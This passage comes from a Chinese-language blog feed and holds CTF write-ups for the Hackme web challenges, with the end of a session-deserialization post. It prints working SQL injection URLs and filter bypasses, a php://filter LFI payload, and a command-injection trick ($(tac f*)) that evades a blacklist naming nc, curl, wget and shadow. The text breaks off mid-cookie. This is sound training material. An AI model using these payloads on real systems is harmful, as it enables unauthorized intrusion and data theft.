this file has started to be processed</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">57343250</span>, </span><br><span class="line">            <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>拿 <code>flag</code> 的老套路就不多说了，把 <code>mdzz</code> 里的值换成你需要执行的操作即可。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>知识面，决定看到的攻击面有多广。</p><p>知识链，决定发动的杀伤链有多深。</p></blockquote><p> ——猪猪侠</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从-session-角度学习反序列化&quot;&gt;&lt;a href=&quot;#从-session-角度学习反序列化&quot; class=&quot;headerlink&quot; title=&quot;从 session 角度学习反序列化&quot;&gt;&lt;/a&gt;从 session 角度学习反序列化&lt;/h1&gt;&lt;p&gt;下面是题目给
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hackme-Web-Writeup</title>
    <link href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/"/>
    <id>https://wywwzjj.top/2019/02/02/Hackme-Writeup/</id>
    <published>2019-02-02T15:23:33.000Z</published>
    <updated>2019-05-23T03:03:58.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a><a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">hide and seek</a></h2><blockquote><p>Can you see me? I’m so close to you but you can’t see me.</p></blockquote><p>这题查看源码即可。</p><h2 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb" target="_blank" rel="noopener">guestbook</a></h2><blockquote><p>This guestbook sucks. <a href="http://sqlmap.org/" target="_blank" rel="noopener">sqlmap</a> is your friend. </p></blockquote><p>既然提示有 <code>sqlmap</code> ，或许可以一把梭。</p><p>先手注一波试试，发现没有任何过滤。</p><p>有四个字段，看一下<strong>显位</strong>。</p><p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrbl15e9j20ls0aijrx.jpg" alt></p><p>都有明显回显，直接上吧，盲注太慢。</p><p><strong>拿到列名</strong></p><p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrl665y7j20ox0amq3k.jpg" alt></p><p><strong>查询所有数据</strong></p><p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jvo2i9hmj20u50acaaw.jpg" alt></p><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a><a href="https://hackme.inndy.tw/lfi/" target="_blank" rel="noopener">LFI</a></h2><blockquote><p>What this admin’s password? That is not important at all, just get the flag. Tips: LFI, <code>php://filter</code></p></blockquote><p>用到 PHP 伪协议：<code>php://filter</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=pages/login</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到 login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'user'</span>] === <span class="string">'admin'</span> &amp;&amp; md5($_POST[<span class="string">'pass'</span>]) === <span class="string">'bed128365216c019988915ed3add75fb'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"?page=pages/login"</span> method=<span class="string">"post"</span> role=<span class="string">"form"</span>&gt;</span><br><span class="line">&lt;div class="form-group"&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"user-i"</span>&gt;User&lt;/label&gt;</span><br><span class="line">&lt;input type="text" class="form-control" id="user-i" placeholder="Username" name="user"&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class="form-group"&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"pass-i"</span>&gt;Password&lt;/label&gt;</span><br><span class="line">&lt;input type="password" class="form-control" id="pass-i" placeholder="Password" name="pass"&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button type="submit" class="btn btn-primary"&gt;Login&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 再看下 config.php，拿到 flag</span></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_xsXSYP......&#125;"</span>;</span><br></pre></td></tr></table></figure><h2 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a><a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">homepage</a></h2><blockquote><p>Where is the flag? Did you check the code? </p></blockquote><p>提示查看源代码，发现了一个特别的 <code>cute.js</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">嚝从㚁����= <span class="regexp">/嚚�嚚榅湛�㚁�� ~�𤫇���𤫇   /</span><span class="comment">/*織����*/</span> [<span class="string">'_'</span>]; o=(嚝�蔑嚝�)  =_=<span class="number">3</span>; c=(嚝巵矋��) =(嚝�蔑嚝�)-(嚝�蔑嚝�); (嚝氱䈑��) =(嚝巵矋��)= (o^_^o)/ (o^_^o);(嚝氱䈑��)=&#123;嚝巵矋��: <span class="string">'_'</span> ,嚝从㚁���� : ((嚝从㚁����==<span class="number">3</span>) +<span class="string">'_'</span>) [嚝巵矋�篏 ,嚝�蔑嚝��� :(嚝从㚁����+ <span class="string">'_'</span>)[o^_^o -(嚝巵矋��)] ,嚝氱䈑����:((嚝�蔑嚝�==<span class="number">3</span>) +<span class="string">'_'</span>)[嚝�蔑嚝篏 &#125;; (嚝氱䈑��) [嚝巵矋�篏 =((嚝从㚁����==<span class="number">3</span>) +<span class="string">'_'</span>) [c^_^o];(嚝氱䈑��) [<span class="string">'c'</span>] = ((嚝氱䈑��)+<span class="string">'_'</span>) [ (嚝�蔑嚝�)+(嚝�蔑嚝�)-(嚝巵矋��) ];(嚝氱䈑��) [<span class="string">'o'</span>] = ((嚝氱䈑��)+<span class="string">'_'</span>) [嚝巵矋�篏;(嚝剠嚝�)=(嚝氱䈑��) [<span class="string">'c'</span>]+(嚝氱䈑��) [<span class="string">'o'</span>]+(嚝从㚁���� +<span class="string">'_'</span>)[嚝巵矋�篏+ ((嚝从㚁����==<span class="number">3</span>) +<span class="string">'_'</span>) [嚝�蔑嚝篏 + ((嚝氱.......</span><br></pre></td></tr></table></figure><p>别的师傅说是 <code>aaencode</code> 加密，我有点懵逼，以后再弄吧，这种题不值得多花时间。</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a><a href="https://hackme.inndy.tw/ping/" target="_blank" rel="noopener">ping</a></h2><blockquote><p>Can you ping 127.0.0.1?</p></blockquote><p>看来是源码审计的题目，命令注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;.&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">        IP: &lt;input type=&quot;text&quot; name=&quot;ip&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Ping&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;&lt;?php</span><br><span class="line">        $blacklist = [</span><br><span class="line">            &apos;flag&apos;, &apos;cat&apos;, &apos;nc&apos;, &apos;sh&apos;, &apos;cp&apos;, &apos;touch&apos;, &apos;mv&apos;, &apos;rm&apos;, &apos;ps&apos;, &apos;top&apos;, &apos;sleep&apos;, &apos;sed&apos;,</span><br><span class="line">            &apos;apt&apos;, &apos;yum&apos;, &apos;curl&apos;, &apos;wget&apos;, &apos;perl&apos;, &apos;python&apos;, &apos;zip&apos;, &apos;tar&apos;, &apos;php&apos;, &apos;ruby&apos;, &apos;kill&apos;,</span><br><span class="line">            &apos;passwd&apos;, &apos;shadow&apos;, &apos;root&apos;,</span><br><span class="line">            &apos;z&apos;,</span><br><span class="line">            &apos;dir&apos;, &apos;dd&apos;, &apos;df&apos;, &apos;du&apos;, &apos;free&apos;, &apos;tempfile&apos;, &apos;touch&apos;, &apos;tee&apos;, &apos;sha&apos;, &apos;x64&apos;, &apos;g&apos;,</span><br><span class="line">            &apos;xargs&apos;, &apos;PATH&apos;,</span><br><span class="line">            &apos;$0&apos;, &apos;proc&apos;,</span><br><span class="line">            &apos;/&apos;, &apos;&amp;&apos;, &apos;|&apos;, &apos;&gt;&apos;, &apos;&lt;&apos;, &apos;;&apos;, &apos;&quot;&apos;, &apos;\&apos;&apos;, &apos;\\&apos;, &quot;\n&quot;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(2);</span><br><span class="line"></span><br><span class="line">        function ping($ip) &#123;</span><br><span class="line">            global $blacklist;</span><br><span class="line"></span><br><span class="line">            if(strlen($ip) &gt; 15) &#123;</span><br><span class="line">                return &apos;IP toooooo longgggggggggg&apos;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                foreach($blacklist as $keyword) &#123;</span><br><span class="line">                    if(strstr($ip, $keyword)) &#123;</span><br><span class="line">                        return &quot;&#123;$keyword&#125; not allowed&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $ret = [];</span><br><span class="line">                exec(&quot;ping -c 1 \&quot;&#123;$ip&#125;\&quot; 2&gt;&amp;1&quot;, $ret);</span><br><span class="line">                return implode(&quot;\n&quot;, array_slice($ret, 0, 10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_GET[&apos;ip&apos;]))</span><br><span class="line">            echo htmlentities(ping($_GET[&apos;ip&apos;]));</span><br><span class="line">        else</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">    ?&gt;&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>发现 <code>$</code> 没有在黑名单内，还可以 ``</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(ls) / `ls`</span></span><br><span class="line">ping: flag.php </span><br><span class="line">index.php: Name or service not known</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat 被过滤了，但有一堆可以查看文件内容的命令啊</span></span><br><span class="line">tac  从最后一行开始显示，可以看出 tac 是 cat 的倒着写！ </span><br><span class="line">more 一页一页的显示档案内容 </span><br><span class="line">less 与 more 类似，但是比 more 更好的是，他可以往前翻页！ </span><br><span class="line">head 只看头几行 </span><br><span class="line">tail 只看尾巴几行 </span><br><span class="line">nl   显示的时候，顺道输出行号！</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 加个 * 模糊匹配一下</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(tac f*)</span></span><br><span class="line">ping: $flag = 'FLAG&#123;ping_$(capture-the-flag)_U.....&#125;';</span><br><span class="line">&lt;?php: Name or service not known</span><br></pre></td></tr></table></figure><h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a><a href="https://hackme.inndy.tw/scoreboard" target="_blank" rel="noopener">scoreboard</a></h2><blockquote><p><strong>DO NOT</strong> ATTACK or SCAN scoreboard, you don’t need to do that.</p></blockquote><p><code>header</code> 里发现了 <code>x-flag</code>。</p><h2 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a><a href="https://hackme.inndy.tw/login0" target="_blank" rel="noopener">login as admin 0</a></h2><blockquote><p>SQL Injection!</p></blockquote><p>题目直接给了源码，开始审计。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">    <span class="comment">// \' =&gt; \\'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!$user): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($user === <span class="keyword">false</span>): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;!-- debug: <span class="meta">&lt;?</span>=$sql<span class="meta">?&gt;</span> --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">            &lt;h4&gt;<span class="meta">&lt;?</span>=sprintf(<span class="string">"You %s admin!"</span>, $user-&gt;is_admin ? <span class="string">"are"</span> : <span class="string">"are not"</span>)<span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">if</span>($user-&gt;is_admin) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;, %s"</span>, htmlentities($flag1), $where_is_flag2); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到 <code>DB_HOST</code> 这些参数还在想有没变量覆盖的洞，或许可连接自己的数据库， <code>safe_filter</code> 这并不能这样玩。</p><p>提示都说了是注入，还是老老实实 <code>sqli</code> 吧，简单的处理了一下 <code>POST</code> 数组，但是并不严格。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">\<span class="string">' =&gt; \\'</span> 即可绕过</span><br></pre></td></tr></table></figure><p>既然加了 <code>or 1</code> ，正常就显示第一条，并不会只查 <code>admin</code> 用户，所以需要手动调下，否则看不到 <code>flag</code> 的噢。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kd6ju1zgj20y60gkmz6.jpg" alt></p><p><code>name=666&amp;password=\&#39; union select 1,1,1,1#</code> 直接就有了。</p><h2 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a><a href="https://hackme.inndy.tw/login0" target="_blank" rel="noopener">login as admin 0.1</a></h2><blockquote><p>Grab the hidden flag</p></blockquote><p>从上一题中可以看到：flag2 in the database!  另外注意到有回显位，就不需要盲注了，然后就是常规套路了。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kdmo441pj20yq0j3gnt.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kdoudznmj20yp0j8ac9.jpg" alt></p><p><img src="C:%5CUsers%5Cwywwzjj%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1556585961992.png" alt="1556585961992"></p><h2 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a><a href="https://hackme.inndy.tw/login1" target="_blank" rel="noopener">login as admin 1</a></h2><blockquote><p>Please login as admin.<br>Tips: SQL Injection but <code>sqlmap</code> not working anymore.<br>Update: Source code is available now.<br><strong>Scanner WON’T WORK</strong></p></blockquote><p>这题同样给了源码，与上一题大同小异，过滤稍微多点吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//require('WAF.php');</span></span><br><span class="line"></span><br><span class="line">$ua = strtolower($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($bad_ua <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">    <span class="keyword">if</span>(strstr($ua, $bad)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"I don't like hackers. :("</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br></pre></td></tr></table></figure><p>空格被过滤了，方法很多，这里以<code>/**/</code> 代替，然后故技重施。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2ke4fuj97j20yp0j340n.jpg" alt></p><h2 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a><a href="https://hackme.inndy.tw/login1" target="_blank" rel="noopener">login as admin 1.2</a></h2><blockquote><p>Get another flag<br>Tips: boolean-based SQL injection, <code>information_schema</code></p></blockquote><p>开始写脚本盲注，网络太慢了，以后搞。</p><h2 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login as admin 3"></a><a href="https://hackme.inndy.tw/login3" target="_blank" rel="noopener">login as admin 3</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'users_db.php'</span>); <span class="comment">// $users</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">($user_data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line"></span><br><span class="line">    $user = [$user_data[<span class="string">'name'</span>], $user_data[<span class="string">'admin'</span>]];</span><br><span class="line"></span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = hash_hmac(<span class="string">'sha512'</span>, $data, $secret);</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    setcookie(<span class="string">'user'</span>, $all, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$error = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $unserialized = json_decode(base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// == 可能绕过</span></span><br><span class="line">    <span class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = json_decode($unserialized[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $data[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $data[<span class="number">1</span>]</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = load_user();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($users <span class="keyword">as</span> $u) &#123;</span><br><span class="line">        <span class="keyword">if</span>($u[<span class="string">'name'</span>] === $_POST[<span class="string">'name'</span>] &amp;&amp; $u[<span class="string">'password'</span>] === $_POST[<span class="string">'password'</span>]) &#123;</span><br><span class="line">            set_user($u);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先用 <code>guest</code> 登录玩玩，<code>cookie</code> 中多了一个 <code>user</code> 的值。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eyJzaWciOiI<span class="number">3</span><span class="symbol">NWQ1</span><span class="name">M2</span>Y<span class="number">5</span><span class="symbol">N2</span>FjZDIxMTA<span class="number">5</span>OGEw<span class="symbol">NTJiMzA1</span>ZDFjYWYxOTE<span class="number">0</span>MzZj<span class="symbol">NmQyOWQxOTM2</span>ZDk<span class="number">0</span><span class="symbol">N2</span>Y<span class="number">4</span>ZmRl<span class="symbol">NzczMzAwOGEzOTY4</span>ZWRhYTRi<span 